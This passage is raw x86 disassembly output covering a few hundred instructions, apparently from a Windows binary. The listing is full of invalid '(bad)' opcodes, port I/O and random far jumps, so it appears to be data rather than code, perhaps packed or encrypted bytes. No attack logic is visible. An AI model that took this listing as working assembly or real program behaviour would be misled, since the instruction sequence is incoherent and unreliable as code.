  40f8c0:	pop    ds
  40f8c1:	and    dl,BYTE PTR [eax+0x4f9b5234]
  40f8c7:	aaa    
  40f8c8:	cmc    
  40f8c9:	clc    
  40f8ca:	adc    ch,bh
  40f8cc:	pop    ss
  40f8cd:	xor    edx,DWORD PTR [esi]
  40f8cf:	and    esp,esp
  40f8d1:	xchg   DWORD PTR [eax+0x6ea21b23],edx
  40f8d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8d8:	mov    dh,0x95
  40f8da:	(bad)  
  40f8db:	addr16 cld 
  40f8dd:	push   edi
  40f8de:	pushf  
  40f8df:	in     eax,0xc8
  40f8e1:	inc    ebx
  40f8e2:	mov    edi,0x9d4ee55d
  40f8e7:	mov    al,ds:0x1b07fdba
  40f8ec:	mov    esi,DWORD PTR [ebx]
  40f8ee:	and    esp,DWORD PTR ds:0xaf5662b0
  40f8f4:	(bad)  
  40f8f5:	out    dx,eax
  40f8f6:	in     al,0xab
  40f8f8:	test   al,0x16
  40f8fa:	out    0xb8,al
  40f8fc:	jb     0x40f90b
  40f8fe:	(bad)  
  40f8ff:	stos   DWORD PTR es:[edi],eax
  40f900:	jb     0x40f8c2
  40f902:	jo     0x40f907
  40f904:	xchg   esi,eax
  40f905:	pop    ss
  40f906:	out    0xb5,eax
  40f908:	fwait
  40f909:	pusha  
  40f90a:	inc    esi
  40f90b:	ffreep st(6)
  40f90d:	or     al,0xc8
  40f90f:	lahf   
  40f910:	mov    esi,0xa6dadd4f
  40f915:	retf   
  40f916:	cmp    eax,DWORD PTR [eax]
  40f918:	push   edi
  40f919:	push   cs
  40f91a:	out    0x6,al
  40f91c:	jp     0x40f95a
  40f91e:	in     al,0x4b
  40f920:	dec    ebp
  40f921:	retf   0xcb56
  40f924:	inc    esi
  40f925:	cmp    edi,ebx
  40f927:	pop    esp
  40f928:	arpl   WORD PTR [eax-0x3816e41b],si
  40f92e:	xor    al,0xa2
  40f930:	out    0xc3,al
  40f932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f933:	push   ebx
  40f934:	jne    0x40f9a5
  40f936:	fwait
  40f937:	or     eax,0x9bdd8f6b
  40f93c:	mov    ds:0x15d816ab,eax
  40f941:	aas    
  40f942:	adc    dh,BYTE PTR [esi-0x5e]
  40f945:	mov    al,BYTE PTR [ecx+0x2941b725]
  40f94b:	adc    al,0xed
  40f94d:	jno    0x40f97f
  40f94f:	inc    ecx
  40f950:	xor    BYTE PTR [esi+edx*4+0x1fb3b0ef],ch
  40f957:	inc    ecx
  40f958:	imul   edi,DWORD PTR [esi-0x7],0xafaf4c5e
  40f95f:	jmp    0x40f9b9
  40f961:	je     0x40f937
  40f963:	stc    
  40f964:	test   edx,0x31ada439
  40f96a:	bound  ecx,QWORD PTR [esi]
  40f96c:	push   ds
  40f96d:	jp     0x40f934
  40f96f:	pop    ebp
  40f970:	test   DWORD PTR [ebp+0x55573376],ecx
  40f976:	mov    eax,ds:0x1834e2af
  40f97b:	push   ecx
  40f97c:	mov    bh,0xf8
  40f97e:	and    al,0xe
  40f980:	fist   WORD PTR [edx+eax*2-0x791025d]
  40f987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f989:	(bad)  
  40f98a:	mov    esi,0xafbbb62e
  40f98f:	pop    edi
  40f990:	mov    eax,0xf1b3b292
  40f995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f996:	add    bl,BYTE PTR [ebx+edi*2-0x53]
  40f99a:	pop    esp
  40f99b:	(bad)  
  40f99c:	into   
  40f99d:	inc    ecx
  40f99e:	inc    esp
  40f99f:	mov    esi,0x3d7a7423
  40f9a4:	dec    eax
  40f9a5:	scas   eax,DWORD PTR es:[edi]
  40f9a6:	outs   dx,BYTE PTR ds:[esi]
  40f9a7:	cmp    esi,DWORD PTR [edx+0x7306aa3b]
  40f9ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9ae:	or     al,0x5
  40f9b0:	gs retf 0xaf09
  40f9b4:	ss push esi
  40f9b6:	push   0xffffff8b
  40f9b8:	icebp  
  40f9b9:	inc    ecx
  40f9ba:	mov    BYTE PTR [esi+0x68],al
  40f9bd:	ja     0x40f988
  40f9bf:	xchg   esp,eax
  40f9c0:	pop    ds
  40f9c1:	or     al,0x5f
  40f9c3:	jmp    0x7308:0x1e9d1f68
  40f9ca:	(bad)  
  40f9cb:	push   ebx
  40f9cc:	mov    esp,0x18aed72b
  40f9d1:	and    bl,al
  40f9d3:	maskmovq mm3,(bad)
  40f9d4:	neg    DWORD PTR [ebp+0x70e5ded7]
  40f9da:	inc    esi
  40f9db:	push   esp
  40f9dc:	clc    
  40f9dd:	jge    0x40fa58
  40f9df:	push   0x6
  40f9e1:	stos   BYTE PTR es:[edi],al
  40f9e2:	sbb    edi,0x915717f8
  40f9e8:	cmp    BYTE PTR [ebx+0x1c],bh
  40f9eb:	test   BYTE PTR [esi],bl
  40f9ed:	mov    esp,0x20a8f82d
  40f9f2:	fisttp WORD PTR [edi-0x77]
  40f9f5:	xlat   BYTE PTR ds:[ebx]
  40f9f6:	xor    al,0xe2
  40f9f8:	(bad)  
  40f9f9:	cmp    DWORD PTR [edi-0x71531296],eax
  40f9ff:	jbe    0x40f9f3
  40fa01:	adc    edi,esi
  40fa03:	ror    BYTE PTR [edx],cl
  40fa05:	shl    dl,cl
  40fa07:	dec    edx
  40fa08:	jnp    0x40f99a
  40fa0a:	into   
  40fa0b:	cs mov eax,0x5400d9fe
  40fa11:	pop    ebx
  40fa12:	jmp    0x12e79198
  40fa17:	dec    esp
  40fa18:	adc    ecx,edx
  40fa1a:	(bad)  
  40fa1b:	out    0x8c,eax
  40fa1d:	and    esi,DWORD PTR [ecx-0x77]
  40fa20:	dec    edx
  40fa21:	add    ecx,ebx
  40fa23:	or     BYTE PTR [esi+0x33],ch
  40fa26:	mov    BYTE PTR [ecx+ebp*2+0x5676a136],ah
  40fa2d:	cs aad 0xc5
  40fa30:	inc    esp
  40fa31:	jae    0x40fa7d
  40fa33:	mov    ah,BYTE PTR [ecx]
  40fa35:	adc    esi,DWORD PTR [edi-0x2b6fc74c]
  40fa3b:	ins    BYTE PTR es:[edi],dx
  40fa3c:	jg     0x40f9ef
  40fa3e:	cmp    ebx,DWORD PTR [edi]
  40fa40:	call   0x924b9245
  40fa45:	jb     0x40fa0e
  40fa47:	ins    DWORD PTR es:[edi],dx
  40fa48:	cmc    
  40fa49:	jnp    0x40fab4
  40fa4b:	pop    ebx
  40fa4c:	dec    esp
  40fa4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa4e:	into   
  40fa4f:	ss xchg esp,eax
  40fa51:	cmc    
  40fa52:	pop    ds
  40fa53:	neg    BYTE PTR [esi-0x4b]
  40fa56:	push   cs
  40fa57:	cld    
  40fa58:	cmc    
  40fa59:	cs mov dl,0xd1
  40fa5c:	push   ecx
  40fa5d:	mov    DWORD PTR [eax+edi*1],edx
  40fa60:	xor    BYTE PTR [esp+eax*8],0x34
  40fa64:	add    eax,0xb207e7fa
  40fa69:	(bad)  
  40fa6a:	in     eax,dx
  40fa6b:	int3   
  40fa6c:	mov    ?,esi
  40fa6e:	add    al,0xd3
  40fa70:	push   edi
  40fa71:	test   BYTE PTR [ebx],0x46
  40fa74:	cwde   
  40fa75:	adc    DWORD PTR [edi],esi
  40fa77:	(bad)
  40fa7c:	loope  0x40fa11
  40fa7e:	fisttp DWORD PTR [ebx]
  40fa80:	ins    BYTE PTR es:[edi],dx
  40fa81:	mov    cl,0x60
  40fa83:	in     al,dx
  40fa84:	xchg   ebx,eax
  40fa85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa86:	lods   al,BYTE PTR ds:[esi]
  40fa87:	mov    ds:0xf540164f,al
  40fa8c:	pusha  
  40fa8d:	pop    edi
  40fa8e:	and    esp,esp
  40fa90:	pushf  
  40fa91:	je     0x40fad5
  40fa93:	call   0x1155:0x11bad5db
  40fa9a:	aaa    
  40fa9b:	jne    0x40faf4
  40fa9d:	call   0x1b57:0xa1199c7
  40faa4:	push   ss
  40faa5:	nop
  40faa6:	fidivr WORD PTR [ecx-0x486919d5]
  40faac:	cmp    al,0x72
  40faae:	add    ch,BYTE PTR [ecx-0x3b9d17c5]
  40fab4:	sub    eax,0xba7cbe17
  40fab9:	not    BYTE PTR [ebx+esi*2+0x1]
  40fabd:	ins    DWORD PTR es:[edi],dx
  40fabe:	add    BYTE PTR [esi+0x51],bh
  40fac1:	les    ebx,FWORD PTR [edi-0x2c955c26]
  40fac7:	imul   ebp,DWORD PTR [edx],0xffffff98
  40faca:	iret   
  40facb:	xor    al,BYTE PTR ss:[edx-0x69]
  40facf:	mov    edi,0xaa04906d
  40fad4:	aas    
  40fad5:	mov    ebx,0x5f907b38
  40fada:	sub    eax,0xf31ce0c5
  40fadf:	test   BYTE PTR [esi-0x78031a78],dl
  40fae5:	inc    edi
  40fae6:	mov    WORD PTR [edx],cs
  40fae8:	xor    ch,BYTE PTR [esi-0x3d5ffef4]
  40faee:	rcr    DWORD PTR [eax-0x280ed4fd],1
  40faf4:	pop    esp
  40faf5:	jne    0x40faf1
  40faf7:	inc    ecx
  40faf8:	mov    ebx,0xab8606ca
  40fafd:	sahf   
  40fafe:	or     al,0x73
  40fb00:	out    dx,al
  40fb01:	sub    esp,edx
  40fb03:	loopne 0x40fb0f
  40fb05:	lahf   
  40fb06:	ins    DWORD PTR es:[edi],dx
  40fb07:	jne    0x40fae0
  40fb09:	cmp    ch,BYTE PTR [ecx+0x42253593]
  40fb0f:	lea    esp,[esi-0x41cf00f1]
  40fb15:	les    eax,FWORD PTR [esi]
  40fb17:	or     eax,edx
  40fb19:	mov    al,0x56
  40fb1b:	dec    edx
  40fb1c:	test   eax,0x5dcb9169
  40fb21:	dec    ebx
  40fb22:	ins    BYTE PTR es:[edi],dx
  40fb23:	mov    ebx,0x5a8c62a4
  40fb28:	or     ah,BYTE PTR [eax+0x5]
  40fb2b:	and    BYTE PTR [edx+eiz*1+0x2e8cf9f2],bl
  40fb32:	xchg   edx,eax
  40fb33:	xor    BYTE PTR [edx+ebx*4+0x1a],al
  40fb37:	mov    dh,dl
  40fb39:	xor    DWORD PTR [eax+ebx*1+0x24a5ddc1],0x542e9507
  40fb44:	ins    DWORD PTR es:[edi],dx
  40fb45:	clc    
  40fb46:	jge    0x40fbac
  40fb48:	cmp    BYTE PTR [ebx*2-0x60712bd1],ch
  40fb4f:	cmp    cl,dh
  40fb51:	mov    esi,0x3eb7833c
  40fb56:	dec    ebp
  40fb57:	ds ins DWORD PTR es:[edi],dx
  40fb59:	and    eax,0x3d3dc494
  40fb5e:	fidiv  WORD PTR gs:[eax-0xb]
  40fb62:	xchg   ebp,eax
  40fb63:	aad    0xb8
  40fb65:	dec    edi
  40fb66:	or     eax,esp
  40fb68:	sub    esi,DWORD PTR [esi-0x265e6f76]
  40fb6e:	sar    DWORD PTR [esi+eiz*4],1
  40fb71:	sbb    edx,DWORD PTR [edx-0x23]
  40fb74:	mov    BYTE PTR [esi-0x7d580273],dh
  40fb7a:	cmp    bl,BYTE PTR [ebx+eiz*1-0x62c79d7]
  40fb81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb82:	xchg   ah,bh
  40fb84:	cmp    DWORD PTR [edi+0x3eca6991],esp
  40fb8a:	push   esi
  40fb8b:	jg     0x40fb1d
  40fb8d:	loopne 0x40fb45
  40fb8f:	pop    eax
  40fb90:	xor    eax,0x81591a2e
  40fb95:	mov    ?,WORD PTR [eax-0x5e]
  40fb98:	lahf   
  40fb99:	mov    ds:0x78f9b3f5,eax
  40fb9e:	sub    BYTE PTR [ebx+0x44eb9ae1],ch
  40fba4:	add    eax,0x952a43cd
  40fba9:	leave  
  40fbaa:	imul   ebx,DWORD PTR [edx-0x67],0x1c
  40fbae:	adc    dh,BYTE PTR ds:[edx]
  40fbb1:	pop    edx
  40fbb2:	gs out dx,eax
  40fbb4:	sbb    DWORD PTR [ebp-0x57],0x279e5713
  40fbbb:	xor    cl,bh
  40fbbd:	mov    DWORD PTR [ebx+0x646ecfb2],edi
  40fbc3:	lods   al,BYTE PTR ds:[esi]
  40fbc4:	inc    esi
  40fbc5:	cli    
  40fbc6:	adc    eax,0x6b8fb97b
  40fbcb:	js     0x40fbba
  40fbcd:	inc    esp
  40fbce:	lods   eax,DWORD PTR ds:[esi]
  40fbcf:	cmp    al,0x9c
  40fbd1:	inc    esi
  40fbd2:	sbb    BYTE PTR [ebp-0x7f],ah
  40fbd5:	int3   
  40fbd6:	and    BYTE PTR [edx],bl
  40fbd8:	mov    ch,0x2a
  40fbda:	xchg   ebp,eax
  40fbdb:	mov    dh,0xe6
  40fbdd:	sub    dh,BYTE PTR [ebp+0x2a4d5780]
  40fbe3:	jne    0x40fc58
  40fbe5:	sahf   
  40fbe6:	xchg   DWORD PTR ds:0x8dba197d,edi
  40fbec:	imul   edx,DWORD PTR [ecx-0x7707c35e],0xe9bd1425
  40fbf6:	into   
  40fbf7:	pop    ebp
  40fbf8:	push   ebp
  40fbf9:	mov    bl,0xd0
  40fbfb:	adc    dl,BYTE PTR [eax-0x19]
  40fbfe:	loopne 0x40fba2
  40fc00:	hlt    
  40fc01:	jmp    0x40fc6b
  40fc03:	sub    dl,ah
  40fc05:	push   0x38
  40fc07:	pushf  
  40fc08:	mov    eax,ds:0x21914d98
  40fc0d:	mov    dl,0x98
  40fc0f:	xor    eax,0x12a81142
  40fc14:	(bad)  
  40fc15:	(bad)  
  40fc17:	daa    
  40fc18:	bound  ecx,QWORD PTR [edx-0x5e2e16ea]
  40fc1e:	shl    DWORD PTR [esi+0x74666204],cl
  40fc24:	(bad)  
  40fc26:	sti    
  40fc27:	dec    ebp
  40fc28:	sbb    BYTE PTR [eax+0x3c92ea48],cl
  40fc2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc2f:	mov    edi,0xb66600e3
  40fc34:	sbb    BYTE PTR [ebp-0x60],dl
  40fc37:	pop    edx
  40fc38:	xchg   ebx,eax
  40fc39:	sti    
  40fc3a:	arpl   WORD PTR [edi-0x4a],cx
  40fc3d:	inc    ecx
  40fc3e:	outs   dx,BYTE PTR ds:[esi]
  40fc3f:	cwde   
  40fc40:	lods   eax,DWORD PTR ds:[esi]
  40fc41:	push   edi
  40fc42:	sahf   
  40fc43:	idiv   BYTE PTR [esi]
  40fc45:	pop    ebp
  40fc46:	scas   eax,DWORD PTR es:[edi]
  40fc47:	sti    
  40fc48:	mov    cl,0x87
  40fc4a:	cwde   
  40fc4b:	dec    edi
  40fc4c:	shl    edi,0x48
  40fc4f:	pop    eax
  40fc50:	std    
  40fc51:	sub    bh,ch
  40fc53:	cs sbb al,0x5
  40fc56:	sbb    esp,DWORD PTR [ebx-0x68]
  40fc59:	dec    eax
  40fc5a:	push   es
  40fc5b:	fisubr DWORD PTR [eax-0x41]
  40fc5e:	fidivr WORD PTR [ecx+ebp*1-0x38]
  40fc62:	in     eax,dx
  40fc63:	or     sp,0xffea
  40fc67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc68:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc6a:	jb     0x40fce3
  40fc6c:	xchg   ecx,eax
  40fc6d:	push   edi
  40fc6e:	dec    esp
  40fc6f:	mov    esi,eax
  40fc71:	dec    esi
  40fc72:	mov    ch,0x2c
  40fc74:	pushf  
  40fc75:	sbb    DWORD PTR [edx+eax*2-0x4aeabf38],eax
  40fc7c:	sbb    eax,DWORD PTR [edx]
  40fc7e:	cld    
  40fc7f:	rcr    DWORD PTR [ecx+0xdef3a8],cl
  40fc85:	or     BYTE PTR [edi+ebx*1],dh
  40fc88:	test   al,0xa6
  40fc8a:	push   esi
  40fc8b:	(bad)  
  40fc8c:	cwde   
  40fc8d:	cmc    
  40fc8e:	and    DWORD PTR [ecx+0x31],ebx
  40fc91:	xor    eax,0xf63f5fda
  40fc96:	xor    eax,0x4c1480cc
  40fc9b:	out    dx,eax
  40fc9c:	ret    
  40fc9d:	ins    DWORD PTR es:[edi],dx
  40fc9e:	int3   
  40fc9f:	aam    0xee
  40fca1:	dec    esp
  40fca2:	lahf   
  40fca3:	or     bh,BYTE PTR [esi-0x7275cfe7]
  40fca9:	dec    esi
  40fcaa:	jne    0x40fd1a
  40fcac:	push   edi
  40fcad:	ss pushf 
  40fcaf:	int    0x42
  40fcb1:	inc    ebx
  40fcb2:	outs   dx,DWORD PTR ds:[esi]
  40fcb3:	xchg   DWORD PTR [edx+eiz*8+0x50a23c64],eax
  40fcba:	and    BYTE PTR [ebx],cl
  40fcbc:	jle    0x40fc4c
  40fcbe:	hlt    
  40fcbf:	jnp    0x40fcb4
  40fcc1:	xchg   edx,eax
  40fcc2:	jmp    0x99ca:0x34679bdd
  40fcc9:	in     al,dx
  40fcca:	rol    BYTE PTR [ebx],1
  40fccc:	lea    esi,[eax]
  40fcce:	sub    bh,dh
  40fcd0:	and    al,0xda
  40fcd2:	pop    eax
  40fcd3:	retf   0x8dcc
  40fcd6:	test   eax,0xb4b618fb
  40fcdb:	aad    0x61
  40fcdd:	lds    ebp,FWORD PTR [edi+ecx*2]
  40fce0:	test   eax,0x167bbd5e
  40fce5:	scas   eax,DWORD PTR es:[edi]
  40fce6:	sub    eax,0xd9abcd51
  40fceb:	fwait
  40fcec:	and    edx,DWORD PTR [ebx]
  40fcee:	test   al,0x72
  40fcf0:	jp     0x40fcbc
  40fcf2:	sbb    bh,BYTE PTR [esi+0x55]
  40fcf5:	pusha  
  40fcf6:	push   0x7
  40fcf8:	push   ecx
  40fcf9:	aad    0x94
  40fcfb:	sar    BYTE PTR [edi],1
  40fcfd:	inc    esp
  40fcfe:	mov    DWORD PTR [edi+0x56b62f0e],edx
  40fd04:	jbe    0x40fcb4
  40fd06:	jne    0x40fd7d
  40fd08:	sti    
  40fd09:	sbb    bh,BYTE PTR [esi]
  40fd0b:	jecxz  0x40fd0c
  40fd0d:	sub    al,0xb4
  40fd0f:	nop
  40fd10:	xor    dh,ah
  40fd12:	or     al,0xea
  40fd14:	icebp  
  40fd15:	sub    ebp,DWORD PTR [ecx+0x24]
  40fd18:	mov    ah,0x36
  40fd1a:	bnd jge 0x40fce3
  40fd1d:	pop    edx
  40fd1e:	fbstp  TBYTE PTR [edx+esi*4-0x36]
  40fd22:	push   esi
  40fd23:	push   esp
  40fd24:	aaa    
  40fd25:	or     bl,BYTE PTR [edi]
  40fd27:	ret    
  40fd28:	gs jno 0x40fcfb
  40fd2b:	push   ds
  40fd2c:	je     0x40fd26
  40fd2e:	loope  0x40fcd4
  40fd30:	loopne 0x40fd11
  40fd32:	jb     0x40fdaa
  40fd34:	pop    ebx
  40fd35:	inc    edi
  40fd37:	xchg   edi,eax
  40fd38:	nop
  40fd39:	bound  edi,QWORD PTR [edi+0x36c68933]
  40fd3f:	jmp    0xb483:0x7cd9179
  40fd46:	push   edi
  40fd47:	pop    es
  40fd48:	fisubr DWORD PTR [eax]
  40fd4a:	pusha  
  40fd4b:	test   BYTE PTR [ebp+0x72],0x35
  40fd4f:	test   DWORD PTR [esi],edx
  40fd51:	fwait
  40fd52:	inc    eax
  40fd53:	sti    
  40fd54:	push   cs
  40fd55:	shr    dh,0xc7
  40fd58:	pop    eax
  40fd59:	(bad)  
  40fd5a:	jo     0x40fd3c
  40fd5c:	mov    ?,edi
  40fd5e:	and    DWORD PTR [ecx],ebx
  40fd60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd61:	jbe    0x40fdc6
  40fd63:	sbb    eax,0x7cf695e6
  40fd68:	pop    ss
  40fd69:	call   0x5529:0x438d878c
  40fd70:	xor    BYTE PTR [edi+0xb06044b],ch
  40fd76:	sbb    DWORD PTR [ebp+0x4bb6c371],esp
  40fd7c:	sbb    al,0x56
  40fd7e:	rcr    BYTE PTR [edx+0x36],cl
  40fd81:	out    dx,al
  40fd82:	jl     0x40fd39
  40fd84:	in     al,0x51
  40fd86:	int    0xe7
  40fd88:	js     0x40fdb2
  40fd8a:	ins    BYTE PTR es:[edi],dx
  40fd8b:	fiadd  DWORD PTR [edi-0x7cea96fa]
  40fd91:	call   0xb869d93
  40fd96:	jecxz  0x40fdb2
  40fd98:	push   esp
  40fd99:	lds    esp,FWORD PTR [ebp-0x48]
  40fd9c:	jle    0x40fd47
  40fd9e:	iret   
  40fd9f:	loop   0x40fd62
  40fda1:	leave  
  40fda2:	adc    DWORD PTR [ecx+0x44],ecx
  40fda5:	loop   0x40fe02
  40fda7:	push   ss
  40fda8:	scas   eax,DWORD PTR es:[edi]
  40fda9:	and    BYTE PTR [edx-0x3b],dh
  40fdac:	(bad)  
  40fdad:	rcr    esp,0xb8
  40fdb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdb1:	sub    eax,0xd1c00c61
  40fdb6:	fcmovbe st,st(1)
  40fdb8:	cmp    al,0xb2
  40fdba:	in     eax,dx
  40fdbb:	mov    ah,0x16
  40fdbd:	mov    ds:0xae9c5f1,al
  40fdc2:	rcr    bl,1
  40fdc4:	cmp    edx,DWORD PTR [ebx]
  40fdc6:	ja     0x40fe25
  40fdc8:	(bad)  
  40fdca:	fbstp  TBYTE PTR [edi+0x4b772ee9]
  40fdd0:	add    BYTE PTR [ebx-0x622b8328],ch
  40fdd6:	jle    0x40fdc0
  40fdd8:	push   ecx
  40fdd9:	inc    ebx
  40fdda:	cmp    eax,0xf7137856
  40fddf:	xor    DWORD PTR [ecx+eiz*1+0x3711aff9],ecx
  40fde6:	dec    edx
  40fde7:	xchg   DWORD PTR ds:0xd8932f94,ebx
  40fded:	add    bl,ch
  40fdef:	rcr    BYTE PTR [edx-0x420e180c],cl
  40fdf5:	das    
  40fdf6:	sub    eax,ebp
  40fdf8:	cmp    edx,edi
  40fdfa:	or     ecx,DWORD PTR [ebx+0x41]
  40fdfd:	add    eax,0x3cc8fb1
  40fe02:	and    BYTE PTR [esi],al
  40fe04:	mov    ecx,0xa2c8cde9
  40fe09:	lea    ebx,[edi+0x34]
  40fe0c:	enter  0x94e,0x44
  40fe10:	pop    ecx
  40fe11:	ss das 
  40fe13:	loop   0x40fe8b
  40fe15:	pop    ds
  40fe16:	sub    eax,0xaf984b4c
  40fe1b:	mov    bh,0xcf
  40fe1d:	stos   DWORD PTR es:[edi],eax
  40fe1e:	leave  
  40fe1f:	inc    esi
  40fe20:	into   
  40fe21:	rcl    DWORD PTR [edi+0x1f],1
  40fe24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe25:	dec    eax
  40fe26:	dec    ebx
  40fe27:	inc    edi
  40fe28:	and    ch,ch
  40fe2a:	push   esp
  40fe2b:	aad    0x52
  40fe2d:	int    0x8
  40fe2f:	pusha  
  40fe30:	xchg   DWORD PTR [edx],edi
  40fe32:	jbe    0x40fe84
  40fe34:	not    DWORD PTR [edx+0x3d137a17]
  40fe3a:	inc    edx
  40fe3b:	outs   dx,DWORD PTR ds:[esi]
  40fe3c:	add    dh,BYTE PTR ds:0x660022b0
  40fe42:	stc    
  40fe43:	cdq    
  40fe44:	mov    BYTE PTR [ebx+0x66],bl
  40fe47:	sbb    ebp,DWORD PTR [ebp+ecx*4-0x4d]
  40fe4b:	adc    ecx,DWORD PTR [esi-0x34]
  40fe4e:	sbb    DWORD PTR [esi+0x6405ab8],ebp
  40fe54:	stos   BYTE PTR es:[edi],al
  40fe55:	add    al,0x74
  40fe57:	out    0xbd,al
  40fe59:	inc    ebp
  40fe5a:	into   
  40fe5b:	call   0x92fcaf79
  40fe60:	mov    edx,0x66cadae4
  40fe65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe66:	ficomp WORD PTR [edx]
  40fe68:	and    BYTE PTR [edi+0x15],al
  40fe6b:	mov    bh,0x57
  40fe6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe6e:	and    al,0x9b
  40fe70:	icebp  
  40fe71:	mov    dl,BYTE PTR [ebp-0x62]
  40fe74:	inc    ebx
  40fe75:	xchg   edi,eax
  40fe76:	call   0xe4ca2640
  40fe7b:	push   ss
  40fe7c:	ds (bad) 
  40fe7e:	data16 fist DWORD PTR [eax]
  40fe81:	jnp    0x40fe6b
  40fe83:	aad    0x72
  40fe85:	or     cl,BYTE PTR [ecx]
  40fe87:	and    dh,0x49
  40fe8a:	fs xchg edi,eax
  40fe8c:	(bad)  
  40fe8d:	push   0xfffffffb
  40fe8f:	inc    ebp
  40fe90:	mov    esi,0xb94efcae
  40fe95:	jg     0x40fef5
  40fe97:	pop    ds
  40fe98:	in     eax,dx
  40fe99:	pop    esp
  40fe9a:	push   eax
  40fe9b:	mov    ds:0xaf4448d3,eax
  40fea0:	loope  0x40feac
  40fea2:	push   cs
  40fea3:	fbstp  TBYTE PTR [eax-0x4a]
  40fea6:	out    dx,al
  40fea7:	push   cs
  40fea8:	cmp    BYTE PTR [eax-0x18],0xdd
  40feac:	loopne 0x40fe46
  40feae:	fdivr  st(2),st
  40feb0:	fimul  DWORD PTR [eax-0x46c3b924]
  40feb6:	mov    dh,0xb9
  40feb8:	add    eax,0xb5e50644
  40febd:	xor    esi,ecx
  40febf:	out    0x0,al
  40fec1:	mov    ebp,0xedfed745
  40fec6:	add    BYTE PTR [ebp-0x4d],0x86
  40feca:	xchg   edi,eax
  40fecb:	mov    edi,0xf00f59c0
  40fed0:	sub    eax,0xaec0298f
  40fed5:	ret    
  40fed6:	mov    ecx,0x84514ad1
  40fedb:	xchg   BYTE PTR ds:0x14ed2a31,cl
  40fee1:	into   
  40fee2:	mov    ebx,0x575b7390
  40fee7:	jnp    0x40ff2d
  40fee9:	jg     0x40ff22
  40feeb:	inc    esp
  40feec:	clc    
  40feed:	mov    bl,0xad
  40feef:	fdivr  st,st(4)
  40fef1:	(bad)  
  40fef2:	jmp    0x67c95def
  40fef7:	(bad)
  40fefb:	adc    eax,0x309cde34
  40ff00:	loopne 0x40fecc
  40ff02:	aam    0xe2
  40ff04:	push   esp
  40ff05:	and    BYTE PTR [esi+ebp*1-0x7ee3e250],ah
  40ff0c:	ret    
  40ff0d:	mov    ah,0xfb
  40ff0f:	out    dx,eax
  40ff10:	ins    DWORD PTR es:[edi],dx
  40ff11:	call   FWORD PTR [ecx]
  40ff13:	jmp    0x2e61:0xa6158d11
  40ff1a:	imul   eax,DWORD PTR [edx+0x43442e9d],0xffffff84
  40ff21:	mov    dx,0xd843
  40ff25:	or     ah,bh
  40ff27:	mov    al,BYTE PTR [eax+ebx*8-0x36]
  40ff2b:	xchg   edx,eax
  40ff2c:	fisub  DWORD PTR [ebp+0x557a4176]
  40ff32:	dec    edi
  40ff33:	je     0x40ff2d
  40ff35:	jb     0x40ff3a
  40ff37:	(bad)  
  40ff38:	mov    ch,0x81
  40ff3a:	push   edi
  40ff3b:	pop    esi
  40ff3c:	sbb    ebp,DWORD PTR [esi-0x7e]
  40ff3f:	xor    DWORD PTR [edi+ebp*4-0x20],edi
  40ff43:	in     eax,0x8b
  40ff45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff46:	mov    edx,ecx
  40ff48:	arpl   WORD PTR [eax+edi*1-0x3d3a6302],bp
  40ff4f:	jb     0x40ff49
  40ff51:	pop    ss
  40ff52:	and    edx,0xd98341d3
  40ff58:	mov    bh,0x12
  40ff5a:	sahf   
  40ff5b:	adc    esi,esp
  40ff5d:	neg    BYTE PTR [ebp-0xc]
  40ff60:	and    BYTE PTR [esi+0x6d],ch
  40ff63:	std    
  40ff64:	(bad)  
  40ff65:	sbb    eax,0xc818f7ca
  40ff6a:	adc    bh,0xfb
  40ff6d:	(bad)  
  40ff6f:	xor    cl,BYTE PTR [eax+ebp*8+0x29]
  40ff73:	gs cmc 
  40ff75:	inc    esi
  40ff76:	test   eax,0x3d17ce34
  40ff7b:	icebp  
  40ff7c:	mov    esi,edi
  40ff7e:	out    dx,eax
  40ff7f:	pop    edi
  40ff80:	lods   eax,DWORD PTR ds:[esi]
  40ff81:	inc    edi
  40ff82:	out    0xf2,eax
  40ff84:	push   ecx
  40ff85:	adc    al,0x13
  40ff87:	in     eax,0xa5
  40ff89:	enter  0x3682,0xdc
  40ff8d:	add    eax,0xf3522fea
  40ff92:	inc    esi
  40ff93:	adc    BYTE PTR [edi],bh
  40ff95:	(bad)  
  40ff96:	shl    BYTE PTR [esi],0xb2
  40ff99:	add    BYTE PTR [eax-0x406cc645],ah
  40ff9f:	pop    esi
  40ffa0:	fist   DWORD PTR [eax]
  40ffa2:	lahf   
  40ffa3:	mov    al,0x9
  40ffa5:	retf   0x1cd5
  40ffa8:	dec    ebx
  40ffa9:	inc    edx
  40ffaa:	in     al,0x2e
  40ffac:	pop    edx
  40ffad:	loop   0x40ffb4
  40ffaf:	pop    edi
  40ffb0:	inc    ecx
  40ffb1:	std    
  40ffb2:	rcl    al,0xcf
  40ffb5:	push   0xffffffd8
  40ffb7:	sbb    dh,BYTE PTR [edx+0x37112c87]
  40ffbd:	or     al,BYTE PTR [ecx+0x4dd9386c]
  40ffc3:	das    
  40ffc4:	push   ss
  40ffc5:	outs   dx,BYTE PTR ds:[esi]
  40ffc6:	stos   DWORD PTR es:[di],eax
  40ffc8:	setno  dh
  40ffcb:	fcmovbe st,st(7)
  40ffcd:	fcomip st,st(3)
  40ffcf:	or     DWORD PTR [eax-0x134eb7e7],eax
  40ffd5:	in     al,0xf8
  40ffd7:	sub    DWORD PTR [ecx+ecx*8],eax
  40ffda:	jne    0x41001a
  40ffdc:	xchg   esp,eax
